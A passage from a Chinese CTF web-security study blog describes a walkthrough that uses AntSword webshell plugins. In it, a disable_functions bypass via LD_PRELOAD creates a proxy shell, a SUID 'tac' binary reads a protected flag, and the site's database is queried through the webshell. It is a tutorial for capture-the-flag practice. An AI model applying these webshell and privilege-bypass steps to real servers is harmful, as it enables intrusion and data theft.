data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071137175.png" alt="image-20220907113751127" style="zoom:50%"><p>是一些不可见字符昂</p><h4 id="3-巧用蚁剑插件当脚本小子"><a href="#3-巧用蚁剑插件当脚本小子" class="headerlink" title="3.巧用蚁剑插件当脚本小子"></a>3.巧用蚁剑插件当脚本小子</h4><p>在这开始我们要准备一个比较新的中国蚁剑，不要像我一样，打开2016版的蚁剑</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071659033.png" alt="image-20220907165937928"></p><p>打开2019版的蚁剑，至少插件商城能用</p><p>装几个插件，这是比较有用的几个，当然根据自己需求在商城里随便装</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071701964.png" alt="image-20220907170134913"></p><p>这里我们不再赘述一句话木马的上传，这时候我们一句话已经连上了，但是无论是读取flag，还是命令执行都没用</p><p>然后，来到上传后的提权/绕过操作</p><p>加载disable_functions,选择第一个LD_PRELOAD，开始</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071717134.png" alt="image-20220907171716075"></p><p>能看到当前目录下生成了一个<code>.antproxy.php</code></p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071722782.png" alt="image-20220907172202728"></p><p>我们直接连这个文件</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071722408.png" alt="image-20220907172258368"></p><p>这时候我们回到终端<code>whoami</code></p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071726093.png" alt="image-20220907172642064" style="zoom:80%"><p>注意这里不要打成<code>who m ai 👴！</code></p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071727973.png" alt="image-20220907172723929" style="zoom:67%"><p>然后我们cat试试</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071728837.png" alt="image-20220907172800805"></p><p>没有权限，看来www-data权限还不够，会不会有其他命令，不用root权限，却能代替cat</p><p>这里来一些Linux知识</p><blockquote><p>在linux下我们经常用到的四个应用程序的目录是/bin、/sbin、/usr/bin、/usr/sbin 。而四者存放的文件一般如下：</p><p><strong>bin目录:</strong></p><p>bin为binary的简写主要放置一些 系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar等。</p><p><strong>/usr/bin目录:</strong></p><p>主要放置一些应用软件工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome<em>、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb</em>、wget等。</p><p><strong>/sbin目录:</strong></p><p>主要放置一些系统管理的必备程序例如:cfdisk、dhcpcd、dump、e2fsck、fdisk、halt、ifconfig、ifup、 ifdown、init、insmod、lilo、lsmod、mke2fs、modprobe、quotacheck、reboot、rmmod、 runlevel、shutdown等。</p><p><strong>/usr/sbin目录:</strong></p><p>放置一些网路管理的必备程序例如:dhcpd、httpd、imap、in.*d、inetd、lpd、named、netconfig、nmbd、samba、sendmail、squid、swap、tcpd、tcpdump等</p><p><strong>综述：</strong></p><p>如果这是用户和管理员必备的二进制文件，就会放在/bin。如果这是系统管理员必备，但是一般用户根本不会用到的二进制文件，就会放在 /sbin。</p><p>相对而言。如果不是用户必备的二进制文件，多半会放在/usr/bin；如果不是系统管理员必备的工具，多半会放在/usr/sbin</p></blockquote><blockquote><p>单纯使用ls命令，显示的内容有限。在实际使用的时候，经常需要搭配一些选项来显示更加丰富的内容，ls常用的附加选项如下表所示：</p><p>-a 显示指定路径中的所有文件，包括隐藏文件<br>-l 显示文件的详细信息，包括文件类型，权限，所属用户，所属用户组，文件大小，上一次修改时间等<br>-h 文件大小以KBytes为单位显示<br>-S 按照文件大小顺序显示，默认从大到小；若要从小到大，可使用-Sr</p></blockquote><p>我们 <code>ls -al /usr/bin</code>发现（这里是fuzz的，其他题也行需要<code>ls -al</code> 其他文件夹，甚至可以<code>ls -al /*/*</code>）</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071734337.png" alt="image-20220907173454307"></p><p>这里的<code>-rwsr-sr-x</code></p><blockquote><p>第一个s代表的是suid：<br>他表示当其他的用户执行此命令时，可以取得和此文件的所有者一样的权限来取得系统资源<br>第而个s代表的是sgid：<br>他表示当其他的用户执行此命令时，可以取得和此文件的属组一样的权限来取得系统资源</p></blockquote><p>总之，<code>tac</code> 可用</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071741558.png" alt="image-20220907174119532"></p><h4 id="4-蚁剑操作数据库"><a href="#4-蚁剑操作数据库" class="headerlink" title="4.蚁剑操作数据库"></a>4.蚁剑操作数据库</h4><p>有时候我们蚁剑连上服务器之后, 会发现服务器目录里没有我们想要的数据, 但是网站却有数据库连接, 这时候我们就可以尝试用蚁剑操作数据库<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303121827489.png" alt="image-20230312182700393"></p><p>然后我们点击添加, 选择好数据库类型, 以及密码就可以连接</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303121829427.png" alt="image-20230312182914367"></p><p>连接后, 我们根据提示, 执行SQL语句就可以拿到flag<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303121830528.png" alt="image-20230312183027472"></p></div><ul class="post-tags-box"><li class="tag-item"><a href="/tags/Web/">#Web</a>&nbsp;</li><li class="tag-item"><a href="/tags/Study/">#Study</a>&nbsp;</li><li class="tag-item"><a href="/tags/PHP/">#PHP</a>&nbsp;</li></ul><div class="article-nav"><div class="article-prev"><a class="prev" rel="prev" href="/2022/09/10/web_3/"><span class="left arrow-icon flex-center"><i class="fas fa-chevron-left"></i> </span><span class="title flex-center"><span class="post-nav-title-item">Web_3_PHP文件包含</span> <span class="post-nav-item">Prev posts</span></span></a></div><div class="article-next"><a class="next" rel="next" href="/2022/09/02/web_1/"><span class="title flex-center"><span class="post-nav-title-item">Web_1_简单信息搜集+burp基本使用</span> <span class="post-nav-item">Next posts</span> </span><span class="right arrow-icon flex-center"><i class="fas fa-chevron-right"></i></span></a></div></div><div class="comment-container"><div class="comments-container"><div id="comments-anchor"></div><div class="comment-area-title"><i class="fas fa-comments"></i>&nbsp;Comments</div><div class="waline-comment-container"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v2/dist/waline-meta.css"><script src="//cdn.jsdelivr.net/npm/@waline/client@v2/dist/waline.js"></script><div id="waline-comment"></div><script>function loadWaline(){Waline.init({el:"#waline-comment",serverURL:"https://waline-charmersix.vercel.app/",lang:"en",comment:".post-comments-count",reaction:!0})}window.addEventListener("DOMContentLoaded",loadWaline)</script></div></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E8%8A%82-php%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">第一节 php的基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x1-php%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="nav-number">1.1.</span> <span class="nav-text">0x1 php的基本概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x2-php%E7%8E%AF%E5%A2%83%E7%9A%84%E5%AE%89%E8%A3%85"><span class="nav-number">1.2.</span> <span class="nav-text">0x2 php环境的安装</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#php-%E7%9A%84%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83"><span class="nav-number">1.2.1.</span> <span class="nav-text">php 的运行环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php-%E7%9A%84%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83"><span class="nav-number">1.2.2.</span> <span class="nav-text">php 的开发环境</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x3-php%E5%86%99%E4%B8%80%E4%B8%AAhello-world"><span class="nav-number">1.3.</span> <span class="nav-text">0x3 php写一个hello world</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x3-php%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95"><span class="nav-number">1.4.</span> <span class="nav-text">0x3 php基础语法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#GET"><span class="nav-number">1.4.1.</span> <span class="nav-text">$_GET</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#POST"><span class="nav-number">1.4.2.</span> <span class="nav-text">$_POST</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#REQUEST"><span class="nav-number">1.4.3.</span> <span class="nav-text">$_REQUEST</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%87%BD%E6%95%B0"><span class="nav-number">1.4.4.</span> <span class="nav-text">函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="nav-number">1.4.5.</span> <span class="nav-text">危险函数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E8%8A%82-php%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">2.</span> <span class="nav-text">第二节 php的命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x1-%E4%BB%80%E4%B9%88%E6%98%AF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">2.1.</span> <span class="nav-text">0x1 什么是命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x2-php%E7%9A%84command-exec%E5%87%BD%E6%95%B0"><span class="nav-number">2.2.</span> <span class="nav-text">0x2 php的command exec函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x3-php%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%A9%E7%94%A8"><span class="nav-number">2.3.</span> <span class="nav-text">0x3 php的命令执行利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.1.</span> <span class="nav-text">绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#base64%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.1.1.</span> <span class="nav-text">base64编码绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%98%E9%87%8F%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-number">2.3.1.2.</span> <span class="nav-text">变量拼接绕过关键字</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%88%86%E7%A0%B4%E8%A2%AB%E8%BF%87%E6%BB%A4%E7%9A%84%E7%AC%A6%E5%8F%B7"><span class="nav-number">2.3.1.3.</span> <span class="nav-text">爆破被过滤的符号</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8D%E5%9B%9E%E6%98%BE"><span class="nav-number">2.3.2.</span> <span class="nav-text">不回显</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"><span class="nav-number">2.3.2.1.</span> <span class="nav-text">写入文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#dns%E9%80%9A%E9%81%93"><span class="nav-number">2.3.2.2.</span> <span class="nav-text">dns通道</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">2.3.2.3.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.3.2.4.</span> <span class="nav-text">时间盲注</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E8%8A%82-php%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">3.</span> <span class="nav-text">第三节 php的代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x1-%E4%BB%80%E4%B9%88%E6%98%AFphp%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">3.1.</span> <span class="nav-text">0x1 什么是php的代码执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x2-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">3.2.</span> <span class="nav-text">0x2 代码执行和命令执行的区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x3-php%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%98%AF%E4%BB%80%E4%B9%88%E6%A0%BC%E5%BC%8F"><span class="nav-number">3.3.</span> <span class="nav-text">0x3 php的代码执行是什么格式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x4-php%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%90%8E%E9%97%A8"><span class="nav-number">3.4.</span> <span class="nav-text">0x4 php的代码执行后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="nav-number">3.5.</span> <span class="nav-text">0x5 代码执行的类型</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%83%A7%E5%A7%BF%E5%8A%BF"><span class="nav-number">4.</span> <span class="nav-text">烧姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">4.0.1.</span> <span class="nav-text">1.无字母数字命令执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">4.0.2.</span> <span class="nav-text">2.无字母数字代码执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E5%B7%A7%E7%94%A8%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6%E5%BD%93%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90"><span class="nav-number">4.0.3.</span> <span class="nav-text">3.巧用蚁剑插件当脚本小子</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E8%9A%81%E5%89%91%E6%93%8D%E4%BD%9C%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">4.0.4.</span> <span class="nav-text">4.蚁剑操作数据库</span></a></li></ol></li></ol></div></div></div></div></div></div></div><div class="page-main-content-bottom"><footer class="footer"><div class="info-container"><div class="copyright-info info-item">&copy; <span>2022.04.28</span> - 2023 &nbsp;<i class="fas fa-heart icon-animate"></i> &nbsp;<a href="/">Charmersix</a></div><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="website-count info-item">Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp; Totalview&nbsp;<span id="busuanzi_value_site_pv"></span></div><div class="theme-info info-item">Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a></div></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="tools-list"><li class="tools-item flex-center toggle-show-toc"><i class="fas fa-list"></i></li><li class="tools-item flex-center go-to-comments"><i class="fas fa-comment"></i> <span class="post-comments-count"></span></li></ul></div></div><div class="right-bottom-side-tools"><div class="side-tools-container"><ul class="side-tools-list"><li class="tools-item tool-font-adjust-plus flex-center"><i class="fas fa-search-plus"></i></li><li class="tools-item tool-font-adjust-minus flex-center"><i class="fas fa-search-minus"></i></li><li class="tools-item tool-dark-light-toggle flex-center"><i class="fas fa-moon"></i></li><li class="tools-item tool-scroll-to-bottom flex-center"><i class="fas fa-arrow-down"></i></li></ul><ul class="exposed-tools-list"><li class="tools-item tool-toggle-show flex-center"><i class="fas fa-cog fa-spin"></i></li><li class="tools-item tool-scroll-to-top flex-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="zoom-in-image-mask"><img class="zoom-in-image"></div><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-input-field-pre"><i class="fas fa-keyboard"></i></span><div class="search-input-container"><input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input"></div><span class="close-popup-btn"><i class="fas fa-times"></i></span></div><div id="search-result"><div id="no-result"><i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i></div></div></div></div></main><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script><div class="post-scripts"><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script></div></body></html>